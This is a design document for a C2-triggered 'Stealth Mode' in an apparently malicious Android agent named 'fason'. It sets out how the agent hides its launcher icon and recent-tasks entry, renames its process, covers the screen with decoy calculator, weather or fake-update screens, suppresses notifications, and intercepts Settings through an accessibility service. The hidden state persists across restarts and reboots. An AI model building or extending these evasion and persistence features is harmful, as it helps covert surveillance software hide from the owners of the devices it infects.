# Stealth Mode — C2-Triggered Auto-Hide

## Overview

Stealth Mode provides C2-controlled hiding of the fason agent from the device UI.
Activated remotely via the dashboard, it operates at three levels of aggression.

## Activation

```json
{
  "type": "0xST",
  "action": "stealth_on",
  "level": 2,
  "skin": 1
}
```

### Levels

| Level | Name | Effects |
|-------|------|---------|
| 1 | BASIC | Hide launcher icon |
| 2 | STANDARD | Hide icon + process rename + decoy launch |
| 3 | AGGRESSIVE | All above + settings intercept + notification suppress |

### Decoy Skins

| Skin | Name | Description |
|------|------|-------------|
| 1 | Calculator | Functional calculator app |
| 2 | Weather | Fake weather widget |
| 3 | System Update | Simulated update progress |

## Commands

| Action | Description |
|--------|-------------|
| `stealth_on` | Activate with level and skin |
| `stealth_off` | Deactivate, restore visibility |
| `stealth_status` | Get current stealth state |
| `decoy_skin` | Change decoy skin (1-3) |

## What IS Hidden (Verified)

✅ Launcher icon (app drawer)
✅ Recent tasks entry
✅ Process name (via /proc/self/comm)
✅ Notification content (suppressed)
✅ Settings search results (intercepted)
✅ App label in various UI elements

## What is NOT Possible (Root Required)

❌ Settings > Apps list — system-enforced
❌ Running processes list — SELinux restricted
❌ Battery usage stats — UID-level tracking
❌ Data usage stats — UID-level tracking

## Architecture

```
C2 Dashboard
    │
    ▼
SocketCommandRouter ──► StealthCommandHandlers
    │
    ▼
StealthModeManager
    │
    ├──► PackageManager (launcher icon)
    ├──► ProcessHider (process rename)
    ├──► DecoyActivity (screen cover)
    ├──► NotificationSuppressor (notif hide)
    └──► AccessibilityService (settings intercept)
```

## Persistence

Stealth state survives:
- App restart (SharedPreferences)
- Device reboot (re-applied in FasonApp.onCreate)
- Process death (re-initialized on service start)

## Safety

- Accessibility verification after stealth activation
- Automatic re-enable if accessibility lost
- Graceful degradation on non-rooted devices
